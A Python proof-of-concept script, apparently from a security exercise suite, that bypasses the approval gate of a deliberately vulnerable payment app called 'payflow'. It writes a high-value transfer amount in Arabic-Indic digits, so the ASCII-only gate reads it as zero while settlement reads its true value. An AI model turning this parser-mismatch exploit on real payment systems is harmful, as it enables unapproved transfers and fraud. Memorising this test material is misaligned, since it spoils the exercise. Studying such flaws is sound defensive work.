"""L09 (payflow) non-ASCII-digit risk-gate bypass PoC.

A transfer at/above the review threshold needs a second approver. The decision
is made by risk/gate.py, which reads the amount off the raw body with an
ASCII-only regex ([0-9]). The settlement path parses the amount with int(),
which accepts non-ASCII (Arabic-Indic) digits. So an amount written in
Arabic-Indic digits is read as 0 by the gate (no approver required) but as its
true value by the executor, settling a high-value transfer with no approver.

Emerges from: config.RISK_SCAN_FIELDS + risk/gate.py (_AMOUNT_RE uses [0-9])
+ utils/money.to_minor_units (int()) + services/transfers.create_transfer.
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

os.environ["PAYFLOW_DB"] = tempfile.mktemp(suffix=".db")
mod, _, _ = load_level("L09")
mod.bootstrap()
client = mod.app.test_client()

THRESH = "300000"  # >= review threshold (100000), < unverified-large (500000)
AUTH = {"Authorization": "Bearer acct-tok-ops"}  # account holder of JP-0001


def arabic(s):
    # map ASCII digits to Arabic-Indic (U+0660..U+0669)
    return "".join(chr(ord(ch) - 0x30 + 0x0660) if ch.isascii() and ch.isdigit() else ch for ch in s)


# control: ASCII high-value transfer is blocked without an approver
r_block = client.post("/accounts/JP-0001/transfers", json={"amount": THRESH, "to": "JP-0002"},
                      headers=AUTH)
ok(r_block.status_code == 402, "ASCII high-value transfer requires an approver")

# control: with a valid approver it settles and is marked reviewed
r_ok = client.post("/accounts/JP-0001/transfers", json={"amount": THRESH, "to": "JP-0002"},
                   headers={**AUTH, "X-Approver": "appr-6f2a"})
ok(r_ok.status_code == 201 and r_ok.get_json()["reviewed"] is True, "approver path works")

# exploit: same value in Arabic-Indic digits settles with NO approver
body = ('{"amount":"%s","to":"JP-0002"}' % arabic(THRESH)).encode("utf-8")
r_ex = client.post("/accounts/JP-0001/transfers", data=body, content_type="application/json",
                   headers=AUTH)
j = r_ex.get_json()
ok(r_ex.status_code == 201, "Arabic-digit high-value transfer settled")
ok(j["amount_minor"] == 300000 and j["reviewed"] is False,
   f"settled {j['amount_minor']} with no review (gate bypassed): {j}")
print("L09 exploit confirmed")
